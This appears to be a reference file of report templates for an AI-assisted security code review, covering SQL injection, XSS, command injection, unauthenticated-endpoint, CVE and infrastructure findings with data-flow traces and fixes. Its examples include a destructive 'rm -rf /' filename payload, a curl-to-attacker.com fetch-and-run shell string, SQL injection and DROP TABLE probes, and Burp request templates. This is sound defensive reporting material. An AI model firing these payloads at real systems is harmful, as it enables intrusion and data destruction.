# Finding Templates (v4.14)

Full Checkmarx-style formats for VULN, AUTH, CVE, IAC, and secrets. Referenced from `SKILL.md` — do not duplicate in the skill body.




## Vulnerability Description Format (MANDATORY)

### Natural Language Description Template

Every vulnerability MUST have a description following this Checkmarx-style format:

```
The method [METHOD_NAME] [VULNERABILITY_ACTION] at line [LINE] of [FILE_PATH]. 
[EXPLANATION_OF_FLOW]. This [TAINTED_DATA_DESCRIPTION] is [HOW_IT_REACHES_SINK] 
without [MISSING_PROTECTION], enabling an attacker to [ATTACK_IMPACT].
```

### Examples of Proper Descriptions

#### XSS Example
```
The method renderAnswerChunkText embeds untrusted data in generated output with 
dangerouslySetInnerHTML, at line 2042 of src/components/OpenAI/index.js. This 
untrusted data originates from the user-controlled 'answer' parameter passed through 
the processResponse function at line 1985. The data flows through formatText (line 2010) 
and sanitizeBasic (line 2025) before reaching the sink. However, sanitizeBasic only 
removes script tags and does not prevent event handler injection. This tainted data 
is embedded into the output without proper contextual encoding, enabling an attacker 
to inject malicious JavaScript code that executes in victims' browsers, potentially 
stealing session tokens, performing actions on behalf of users, or defacing the page.
```

#### SQL Injection Example
```
The method getUserById constructs a SQL query using string concatenation with the 
user-supplied 'userId' parameter, at line 156 of src/api/controllers/UserController.java. 
The userId originates from the HTTP request parameter at line 142 in the getUser endpoint. 
This untrusted data flows through the validateInput method (line 148) which only checks 
for null values but does not sanitize SQL metacharacters. The tainted data is then 
concatenated directly into the SQL query string at line 156 and executed via 
statement.executeQuery() at line 158. This enables an attacker to inject arbitrary 
SQL commands to bypass authentication, extract sensitive data from other tables, 
modify or delete database records, or potentially execute operating system commands 
on the database server.
```

#### Command Injection Example
```
The method processUpload passes user-controlled filename to a shell command via 
os.system(), at line 89 of src/utils/file_handler.py. The filename originates from 
the multipart form data parsed at line 72 in the upload_file endpoint. This untrusted 
data is stored in the 'original_filename' variable at line 75 and passed to 
sanitize_filename (line 78) which only removes path separators but allows shell 
metacharacters. The tainted filename is then interpolated into the shell command 
f"convert {filename} -resize 800x600 {output_path}" at line 89 without proper 
escaping, enabling an attacker to inject arbitrary shell commands by crafting a 
malicious filename such as "; rm -rf / #" or "$(curl attacker.com/shell.sh|bash)", 
leading to complete server compromise.
```

---

## Vulnerable Code Snippet Format (MANDATORY)

Every finding MUST include **`### Vulnerable Code Snippet`** with **real code** from the repository (after `Read` at reported lines). Place it **after** `### Description` and **before** `### Data Flow Trace`.

**Rules:**
- Include **source** and **sink** lines in one or two fenced blocks
- Add `// SOURCE` and `// SINK` comments; include `file:line` in block header comment
- Do not paraphrase — copy verbatim from the codebase
- Elide only unrelated middle lines with `// ...`

```markdown
### Vulnerable Code Snippet

```javascript
// routes/catalog-proxy.js — lines 45–52
router.get('/fetchResource', function (req, res) {
  var url = req.query.url;                         // SOURCE: HTTP query param
  request(url, function (err, response, body) {  // SINK: outbound SSRF
    res.send(body);
  });
});
```
```

**By finding type:**
| Type | Snippet content |
|------|-----------------|
| VULN | User input source + dangerous sink |
| AUTH | Route registration without auth middleware |
| CVE | `require('pkg')` + vulnerable API call |
| IAC | Misconfigured resource stanza |

Full templates: **`references/report-vulnerable-code-dataflow.md`**

---

## Stack Trace / Data Flow Format (MANDATORY)

Every finding MUST include a complete stack trace showing the data flow:

```markdown
### Data Flow Trace (Source → Sink)

┌─────────────────────────────────────────────────────────────────────────────────┐
│ TAINT PROPAGATION PATH                                                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─ SOURCE ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     142                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String userId = request.getParameter("id");                     │  │
│  │ Type:     HTTP Request Parameter (User-Controlled)                        │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ STEP 1 ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     145                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String validatedId = validateInput(userId);                     │  │
│  │ Analysis: Validation only checks for null, not SQL metacharacters         │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ STEP 2 ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     148                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String query = "SELECT * FROM users WHERE id = '" + validatedId │  │
│  │ Analysis: Tainted data concatenated into SQL string                       │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ SINK ────────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     150                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     ResultSet rs = statement.executeQuery(query);                   │  │
│  │ Type:     SQL Query Execution (Dangerous Operation)                       │  │
│  │ Status:   ⚠️ TAINTED DATA REACHES SINK WITHOUT SANITIZATION               │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

### Simplified Flow
\`\`\`
request.getParameter("id")     [UserController.java:142]  ─┐
                                                           │
    └─► validateInput(userId)  [UserController.java:145]  ─┤ NO SANITIZATION
                                                           │
        └─► query = "SELECT..."+validatedId [line:148]    ─┤ STRING CONCAT
                                                           │
            └─► statement.executeQuery(query) [line:150]  ─┘ SQL EXECUTION
\`\`\`
```

---

## Complete Finding Format

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [CRITICAL] SQL Injection in User Authentication                    [VULN-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| **Severity**       | Critical / High / Medium / Low / Info               |
| **AI Verdict**     | TRUE POSITIVE / FALSE POSITIVE / FILTERED          |
| **Exploitable**    | Yes / No / Hardening                               |
| Vulnerability Type | SQL Injection                                      |
| CWE ID             | CWE-89: Improper Neutralization of Special Elements|
| OWASP Category     | A03:2021 - Injection                              |
| SANS CWE Top 25    | CWE-89 (#3)                                        |
| CVSS Score         | 9.8 (Critical)                                     |
| Confidence         | High                                               |
| **Source (full path)** | `src/api/controllers/UserController.java:142`  |
| **Sink (full path)**   | `src/api/controllers/UserController.java:150`  |
| Best Fix Location  | Line 148 (query construction)                      |

### Description

[Checkmarx-style narrative — see templates above]

### Assumptions

| Assumption | Realistic? |
|------------|------------|
| [e.g. Attacker can reach staging host without VPN] | Yes / No |
| [e.g. Gateway does not enforce SSO on this route] | Yes |

List G5 assumptions explicitly. Many unlikely assumptions → downgrade or Appendix A.

### Vulnerable Code Snippet

```java
// UserController.java — lines 142–150
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");              // SOURCE
    String validatedId = validateInput(userId);              // STEP: null check only
    
    String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";  // string concat
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);                 // SINK
    // ...
}
```

### Data Flow Trace

[Full stack trace as shown above]

### Attack Vectors

\`\`\`
# Authentication Bypass
GET /api/users?id=' OR '1'='1' --

# Data Exfiltration  
GET /api/users?id=' UNION SELECT username,password,null FROM admin_users --

# Database Manipulation
GET /api/users?id='; DROP TABLE users; --

# Blind SQL Injection (Time-based)
GET /api/users?id=' AND SLEEP(5) --
\`\`\`

### Burp Suite PoC (MANDATORY for HTTP-exploitable findings)

Provide a **complete raw HTTP request** ready for Burp Repeater. Use placeholders for secrets. Mark Intruder positions with `§payload§`.

\`\`\`http
GET /api/users?id=§1' OR '1'='1'--§ HTTP/1.1
Host: staging.example.com
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Cookie: session=[SESSION_COOKIE]
\`\`\`

| Field | Value |
|-------|-------|
| **Prerequisites** | Public endpoint OR valid session from `/login` |
| **Auth required** | No / Yes — [describe] |
| **Intruder position** | `id` parameter |
| **Payload list** | `' OR '1'='1'--`, `' UNION SELECT...`, `' AND SLEEP(5)--` |
| **Expected confirmation** | HTTP 200 + extra records / SQL error in body / 5s delay |
| **Destructive** | No — read-only probe |

**Multi-step exploits:** number steps (Step 1 store payload → Step 2 trigger). For non-HTTP findings write: `Burp PoC: N/A — not HTTP-exploitable`.

See **`references/burp_poc_templates.md`** for class-specific templates (SQLi, XSS, SSRF, IDOR, NoSQL, etc.).

### Impact Assessment

| Impact Category    | Level  | Description                                       |
|--------------------|--------|---------------------------------------------------|
| Confidentiality    | HIGH   | Attacker can read any data from the database      |
| Integrity          | HIGH   | Attacker can modify or delete any records         |
| Availability       | HIGH   | Attacker can drop tables or corrupt database      |
| Authentication     | HIGH   | Complete authentication bypass possible           |
| Business Impact    | SEVERE | Data breach, regulatory fines, reputation damage  |

### AI Validation Details

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    AI VALIDATION CHECKLIST                      │
├─────────────────────────────────────────────────────────────────┤
│ 1. Source Analysis                                              │
│    ├─ Is input user-controlled?           ✅ YES               │
│    ├─ Input type: HTTP GET parameter                           │
│    └─ Can attacker influence value?       ✅ YES               │
│                                                                 │
│ 0. Pre-Report Gates (G1–G5)                                     │
│    ├─ G1 Attacker-controlled input?       ✅ YES               │
│    ├─ G2 Reaches sink realistically?      ✅ YES               │
│    ├─ G3 Protection bypassed?             ✅ YES               │
│    ├─ G4 Practically exploitable?         ✅ YES               │
│    └─ G5 Assumptions minimal?             ✅ YES               │
│                                                                 │
│ 2. Sanitization Check                                           │
│    ├─ Input validation present?           ⚠️ PARTIAL           │
│    ├─ Validation type: Null check only                         │
│    ├─ SQL metacharacters filtered?        ❌ NO                │
│    └─ Parameterized query used?           ❌ NO                │
│                                                                 │
│ 3. Sink Reachability                                            │
│    ├─ Code path accessible?               ✅ YES               │
│    ├─ Authentication required?            ❌ NO (Public API)   │
│    └─ Is this production code?            ✅ YES               │
│                                                                 │
│ 4. Exploitability                                               │
│    ├─ Can payload reach sink intact?      ✅ YES               │
│    ├─ Standard techniques work?           ✅ YES               │
│    └─ Real-world impact?                  ✅ YES (Data breach) │
│                                                                 │
│ ═══════════════════════════════════════════════════════════════ │
│ VERDICT: ✅ TRUE POSITIVE - Confirmed Exploitable               │
│ REASONING: User input reaches SQL execution without             │
│            parameterization or proper sanitization.             │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

### Remediation

#### Recommended Fix: Parameterized Queries (PreparedStatement)

**BEFORE (Vulnerable):**
\`\`\`java
// UserController.java - Lines 142-150
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");              // Line 142 - SOURCE
    String validatedId = validateInput(userId);              // Line 145
    
    // VULNERABLE: String concatenation
    String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";  // Line 148
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);                 // Line 150 - SINK
    // ...
}
\`\`\`

**AFTER (Secure):**
\`\`\`java
// UserController.java - Lines 142-155
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");
    
    // Input validation - type check
    if (userId == null || !userId.matches("^[0-9]+$")) {
        throw new IllegalArgumentException("Invalid user ID format");
    }
    
    // SECURE: Parameterized query prevents SQL injection
    String query = "SELECT * FROM users WHERE id = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, userId);  // Automatically escapes special characters
    ResultSet rs = pstmt.executeQuery();
    // ...
}
\`\`\`

#### Alternative Fix: ORM/JPA

\`\`\`java
// Using Spring Data JPA
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    // Spring Data automatically uses parameterized queries
    Optional<User> findById(Long id);
}

// In controller
public User getUser(@RequestParam Long id) {
    return userRepository.findById(id)
        .orElseThrow(() -> new UserNotFoundException(id));
}
\`\`\`

#### Defense in Depth Recommendations

1. **Input Validation**: Validate userId is numeric before processing
2. **Least Privilege**: Database user should have minimal permissions
3. **WAF Rules**: Deploy SQL injection detection rules
4. **Monitoring**: Log and alert on SQL errors indicating injection attempts

### References

| Resource | Link |
|----------|------|
| CWE-89 | https://cwe.mitre.org/data/definitions/89.html |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
| Java PreparedStatement | https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Hardcoded Secret Finding Format (VULN-NNN — secrets)

Use when **SAST-SECRET-01…11** or **SAST-OG-10** confirms a committed credential. **Always** label the secret type per **`secret-type-labels.md`**.

### Classification (mandatory fields)

| Attribute | Value |
|-----------|-------|
| Vulnerability Type | Hardcoded Credentials / Sensitive Data Exposure |
| **Secret Type** | **[e.g. RabbitMQ password (AMQP connection string)]** |
| **Service / Vendor** | **[e.g. RabbitMQ, GitHub, AWS, MapMyIndia, Strapi, IRCTC]** |
| **Credential Role** | API key / password / connection string / private key / OAuth token |
| CWE ID | CWE-798 |
| OWASP Category | A07:2021 - Identification and Authentication Failures |
| Severity | Critical / High / Medium (see `secrets-patterns.md`) |
| AI Verdict | ✅ TRUE POSITIVE |

### Description template

The **[Secret Type]** is hardcoded at line **N** of **[file]**. The value is embedded in **[config / source]** and used at runtime for **[service authentication / signing]**. Repository or config access enables extraction of this **[Secret Type]** — **[impact]**.

**Redact** secret value in report (`[REDACTED]` or prefix/suffix only).

Include **Vulnerable Code Snippet**, **Data Flow Trace** (config → runtime consumer), **Remediation** (env var / vault + rotation), and `Burp PoC: N/A` unless secret is exposed over HTTP.

---

## Unauthenticated Endpoint Finding Format (AUTH-NNN)

Use for **missing or weak authentication** on HTTP routes. Separate ID series from `VULN-NNN`. **Validate every AUTH candidate** with Burp or curl when a staging host exists in code.

### Severity & Status Rules (MANDATORY)

| Condition | Severity | Status |
|-----------|----------|--------|
| Code shows missing auth; live test not run (but host exists) | **Medium** | **Not Verified** — **still file AUTH-NNN + mandatory Burp PoC** |
| Burp/curl without auth → app responds (2xx business body, or 4xx validation without auth challenge) | **High** | **Verified in Burp** (or **Verified in curl**) |
| Code suggests missing auth; Burp returns 401/403 auth error or login redirect | **Medium** | **Not Verified** (auth at gateway) — **mandatory Burp PoC for manual retest** |
| Burp returns WAF 403 only | **Medium** | **Not Verified** (WAF blocked) — **mandatory Burp PoC** |
| No external host in code | **Medium** | **Not Verified (no target host in code)** — **mandatory Burp PoC with placeholder host** |

> **Every AUTH-NNN** must include `### Burp Suite PoC` with a complete raw HTTP request — **even when Not Verified**. Severity Medium does **not** exempt PoC or other required sections.

> Injection/IDOR on the same route may still be a separate `VULN-NNN` at Critical/High — AUTH findings measure **access control**, not payload exploitability.

### AUTH Finding Template

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [HIGH|MEDIUM] Unauthenticated Endpoint — [METHOD] [PATH]              [AUTH-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Vulnerability Type | Missing Authentication / Broken Access Control     |
| CWE ID             | CWE-306: Missing Authentication for Critical Function |
| OWASP Category     | A01:2021 - Broken Access Control                  |
| Severity           | High (Verified in Burp) OR Medium (Not Verified)   |
| Status             | Verified in Burp / Not Verified                    |
| Confidence         | High (code) / High (code + live)                   |
| AI Verdict         | ✅ TRUE POSITIVE (missing auth middleware)         |
| **Source (full path)** | `src/routes/api/index.js:520`                  |
| **Sink (full path)**   | `src/routes/api/index.js:520`                  |

### Location Summary
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Router File        | src/routes/api/index.js                            |
| Route Line         | 520                                                |
| Method / Path      | GET /order/details                                 |
| Auth Expected      | verifySsoToken chain                               |
| Auth Present       | None in handler chain                              |
| Bypass Notes       | N/A — or `isSeller=true` skips SSO                 |

### Description

The route **GET /order/details** is registered at line **520** of **src/routes/api/index.js** 
without **verifySsoToken**, **AuthHandler.verifySsoToken**, or **Handler.verifySsoToken** in its 
middleware chain. Any client that can reach this host may invoke order-detail logic without a 
valid SSO session [unless gateway/WAF blocks unauthenticated traffic — see Live Verification].

### Route Handler Chain (code)

See **Vulnerable Code Snippet** below — route registered without auth middleware.

### Vulnerable Code Snippet

```javascript
// src/routes/api/index.js — line 520
router.get('/order/details', Validator..., Preparer..., Handler..., Responder.respond);
// Missing: verifySsoToken / AuthHandler.verifySsoToken in chain
```

### Data Flow Trace

| Step | Location | Analysis |
|------|----------|----------|
| SOURCE | HTTP GET /order/details | Unauthenticated client |
| STEP 1 | routes/api/index.js:520 | No SSO middleware in chain |
| SINK | Handler → business logic | Order/PII returned |

### Simplified Flow

```
GET /order/details (no Cookie) → route without verifySsoToken → handler executes
```

### Live Verification (Burp MCP)

| Field | Value |
|-------|-------|
| Burp MCP | Available / Not available |
| Tool | `send_http1_request` (server: `user-burp`) |
| Host | [TARGET_HOST] |
| Auth headers | None (no Cookie, Authorization, SSO) |
| HTTP status | 200 |
| Response indicator | [order_id, passenger name, PII markers] |
| **Status** | **Verified in Burp** |
| **Severity** | **High** |

### Burp Suite PoC (MANDATORY — include when Verified OR Not Verified)

\`\`\`http
GET /api/v1/order/details?order_id=[ORDER_ID] HTTP/1.1
Host: [TARGET_HOST]
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Connection: close

\`\`\`

| Field | Value |
|-------|-------|
| **Live status** | Verified in Burp / Not Verified — [reason] |
| **Severity** | High (verified) OR Medium (not verified) |
| **Auth sent** | None |
| **Expected if app-layer auth missing** | 2xx/4xx business body — not 401 |
| **Manual test** | Paste into Burp Repeater if live probe skipped |

### Impact Assessment

| Impact Category    | Level  | Description                                       |
|--------------------|--------|---------------------------------------------------|
| Confidentiality    | HIGH   | Order/PII readable without login                  |
| Integrity          | MEDIUM | Depends on endpoint (read vs state-change)        |
| Authentication     | HIGH   | No SSO required at application layer              |

### Remediation

Add **Preparer.verifySsoToken**, **AuthHandler.verifySsoToken**, **Handler.verifySsoToken** to the 
route chain (match neighboring protected routes). For intentionally public endpoints, document 
in OpenAPI and enforce rate limiting + minimal response schema.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Exploitable CVE Finding Format (CVE-NNN)

Use when a **published CVE** (Critical/High) is **reachable and exploitable** in this codebase — not for unreachable transitive deps.

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [CRITICAL|HIGH] Exploitable CVE — [PACKAGE] [CVE-YYYY-NNNNN]           [CVE-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute | Value |
|-----------|-------|
| CVE ID | CVE-YYYY-NNNNN |
| CVSS | X.X (Critical/High) |
| Package | name@affected_version |
| Fixed in | name@fixed_version |
| CWE | CWE-XXX |
| AI Verdict | ✅ EXPLOITABLE (reachable) |

### Reachability Proof
| Step | Location | Evidence |
|------|----------|----------|
| Advisory | npm audit / NVD | Critical/High |
| Lockfile | package-lock.json | version X.Y.Z present |
| Import | routes/foo.js:12 | `require('package')` |
| Call site | api/bar.js:89 | vulnerable API invoked |
| User path | GET /api/baz | `graphify path` req → sink |

### Exploit Scenario
[How attacker triggers vulnerable code — 2-4 sentences]

### Vulnerable Code Snippet

```javascript
// routes/foo.js:12 + api/bar.js:89
const pkg = require('vulnerable-package');   // lockfile version X.Y.Z
// ...
pkg.vulnerableMethod(userInput);             // SINK per CVE advisory
```

### Data Flow Trace

| Step | Location | Evidence |
|------|----------|----------|
| SOURCE | GET /api/baz | User-controlled input |
| STEP 1 | routes/foo.js:12 | `require('vulnerable-package')` |
| SINK | api/bar.js:89 | Vulnerable API invoked |

### Remediation
1. Upgrade to `package@fixed_version`
2. `npm ci` / regenerate lockfile
3. Re-run CVE-REACH checks

**Burp PoC:** N/A unless HTTP-triggered — or include HTTP request if applicable.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Downgrade rules:** CVE in lockfile but **no import** → Appendix A (not reachable); internal scan log = PASS.

---

## IaC Misconfiguration Finding Format (IAC-NNN)

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [HIGH|MEDIUM] IaC Misconfiguration — [TITLE]                            [IAC-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute | Value |
|-----------|-------|
| Type | Docker / Kubernetes / Terraform / Nginx / CI |
| Check ID | IAC-DOCKER-01 (etc.) |
| **Source (full path)** | `infra/nginx/staging.conf:42` |
| **Sink (full path)** | `infra/nginx/staging.conf:42` |
| Severity | High |
| Exposure | Internet-facing / internal |
| AI Verdict | ✅ TRUE POSITIVE |

### Description
The [resource] at line **N** of **[file]** [misconfiguration detail]. In production this 
[impact: root container, open SG, missing HSTS, etc.].

### Vulnerable Code Snippet

```yaml
# Dockerfile — line 12
USER root          # SINK: container runs as root
```

### Data Flow Trace

| Step | Location | Analysis |
|------|----------|----------|
| SOURCE | Container start | Process runs as configured user |
| SINK | Dockerfile:12 | `USER root` — full host compromise on breakout |

### Blast Radius (ARCH-07)
[Can attacker reach secrets, cluster admin, or customer data from this misconfig?]

### Remediation
**BEFORE:** [snippet]
**AFTER:** [secure snippet]

**Burp PoC:** N/A — infrastructure finding (unless HTTP header visible at edge).
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---
